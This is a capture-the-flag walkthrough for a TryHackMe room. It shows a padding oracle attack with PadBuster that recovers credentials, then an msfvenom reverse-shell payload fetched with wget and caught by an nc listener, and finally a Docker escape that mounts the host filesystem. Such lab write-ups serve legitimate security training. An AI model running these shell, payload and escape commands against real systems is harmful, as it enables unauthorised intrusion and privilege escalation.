# New York Flankees

https://tryhackme.com/r/room/thenewyorkflankees, Medium difficulty

Good use of an old technique in this room.

1. Two ports are open, 22 and 8080. On 8080 is a simple website. On 8080 the site proclaim's itself as a blog supported by 'ORACLE'. This is a hint to the key path in this room.
2. A linked page is `/debug.html`, which displays a few fixed error messages. However, looking into its source reveals the following javascript:

   ```javascript
   function stefanTest1002() {
    var xhr = new XMLHttpRequest();
    var url = "http://localhost/api/debug";
    // Submit the AES/CBC/PKCS payload to get an auth token
    // TODO: Finish logic to return token
    xhr.open("GET", url + "/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4", true);

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log("Response: ", xhr.responseText);
        } else {
            console.error("Failed to send request.");
        }
    };
    xhr.send();
   }
   ```
3. If the url in question is called directly (noting that it should be the box's ip on 8080, not localhost:80 as in the code above), but with a slight mangling of the encrypted string, will result in a 500 'Decryption error', as opposed to a 200 'Custom authentication success' for the original string.

4. This suggests a [padding oracle attack](https://en.wikipedia.org/wiki/Padding_oracle_attack), especially with the site's reference to 'ORACLE'. A long term tool I have used for this is https://github.com/AonCyberLabs/PadBuster, a perl tool from way back (13 years ago!). This works very well:

```
sudo apt install libcrypt-ssleay-perl -y
git clone https://github.com/AonCyberLabs/PadBuster
chmod +x ./PadBuster/padBuster.pl
./PadBuster/padBuster.pl http://10.10.245.217:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 16 -encoding 2
```

To explain the command a little briefer, its the default required args (including specifying 16 byte block size) plus `-encoding 2`, which specifies the encoding is upper case hex. The format is `[full url including the encrypted value] [the encrypted value] [blocksize] -encoding 2`

This will quickly decode the result, which will then be printed in ascii and reveal a set of credentials (which is also the first room question).

5. The credentials work via the admin login, which allows access to a 'debug' page with the first flag. This contains a form field that can run commands - but not return any output.

6. To get a shell, you can create a payload e.g. with msfvenom: `msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.247.53 lport=4444 -f elf > connect`. Hosting this on the attackbox via a webserver, and set up a `nc -nvlp 4444` listener. Then the following commands can be used to catch the shell:

```
wget 10.10.247.53:1234/connect -O /tmp/connect
chmod +x /tmp/connect
/tmp/connect
```

7. This puts you as root inside a docker container. The site is at /app, and by reading the docker-compose.yml file in there, you can retrieve the second, 'docker flag'.
8. Escape is fairly trivial: docker is available as a command within the container, and as you are root, you can use it to mount the host OS; first, you can see images you might use with `docker images`, revealing openjdk:11 among others - this image is used by the kotlin app. Which image doesn't really matter. Additionally, you will need a full pty for this to work:

```
/usr/bin/python3.9 -c 'import pty; pty.spawn("/bin/bash")'
docker run -it -v /:/host/ openjdk:11 chroot /host/ bash
```

This command starts an interactive bash shell, after mounting the host OS as /host and then chroot'ing at /host. The final flag is at `/flag.txt`
